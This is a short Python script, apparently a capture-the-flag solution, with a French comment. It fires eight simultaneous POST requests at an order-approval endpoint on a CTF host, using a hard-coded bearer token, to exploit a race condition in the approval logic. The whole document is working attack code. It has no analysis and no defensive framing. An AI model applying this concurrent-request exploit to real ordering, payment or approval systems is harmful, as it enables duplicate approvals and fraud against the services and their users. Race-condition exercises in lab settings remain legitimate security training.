import concurrent.futures
import requests

url = "http://w01.ctf.chronos-security.ro:41532/orders/AO-7D31C9/approve"
headers = {"Authorization": "Bearer opk_vega7_2f4b9c17e0a3"}

def send_approval():
    try:
        response = requests.post(url, headers=headers)
        return response.status_code, response.text
    except Exception as e:
        return None, str(e)

# Envoi d'un burst de 8 requêtes simultanées comme mentionné dans le schéma
with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
    futures = [executor.submit(send_approval) for _ in range(8)]
    for future in concurrent.futures.as_completed(futures):
        print(future.result())
